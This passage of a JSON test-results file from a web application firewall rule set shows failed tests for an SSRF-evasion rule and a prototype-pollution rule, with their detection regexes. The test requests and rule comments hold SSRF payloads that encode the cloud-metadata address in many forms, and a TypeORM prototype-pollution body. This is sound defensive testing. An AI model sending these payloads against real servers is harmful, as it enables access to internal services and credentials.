        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 42,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Glibc NSS features",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 42,
      "desc" : "SSRF - Glibc NSS features",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://\\\\g\\\\o\\\\o\\\\g\\\\l\\\\e.\\\\c\\\\o\\\\m/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 43,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Input variable coverage test (Dotless decimal)",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920451 - HTTP header is restricted by policy (host)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (user-agent)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-encoding)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-language)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (cookie)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-charset)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept)" ]
    },
    "test" : {
      "test_id" : 43,
      "desc" : "SSRF - Input variable coverage test (Dotless decimal)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Cookie" : "ssrf=http://2852039166/"
          },
          "method" : "GET",
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Cookie" : "http://2852039166/"
          },
          "method" : "GET",
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "POST",
          "uri" : "/post",
          "data" : "----------397236876\nContent-Disposition: form-data; name=\"file\"; filename=\"http://2852039166/?.txt\"\nContent-Type: text/plain\n\nMy epic SSRF attempt\n\n----------397236876--\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?http://2852039166/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://2852039166/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      }, {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Charset" : "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "data" : "<?xml version=\"1.0\"?><xml><ssrf>http://2852039166/</ssrf></xml>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934130",
    "test_id" : 2,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934130.yaml",
    "description" : "positive test case with JSON POST",
    "cause" : "failed expect_id check: 934130 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "positive test case with JSON POST",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "{\"text\":\"a\",\"title\":{\"__proto__\":{\"where\":{\"name\":\"sqlinjection\",\"where\":null}}}}\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934130,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " JavaScript prototype pollution injection attempts"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Example from https://hackerone.com/reports/869574 critical"
        }, {
          "type" : "Comment",
          "text" : " vulnerability in the TypeORM library:"
        }, {
          "type" : "Comment",
          "text" : " {\"text\":\"a\",\"title\":{\"__proto__\":{\"where\":{\"name\":\"sqlinjection\",\"where\":null}}}}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Test cases are based on this list of payloads:"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/BlackFan/client-side-prototype-pollution/blob/master/README.md"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See also: https://cwe.mitre.org/data/definitions/1321.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Note: only server-based (not DOM-based) attacks are covered here."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:__proto__|constructor\\s*(?:\\.|\\]?\\[)\\s*prototype)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "JavaScript Prototype Pollution"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
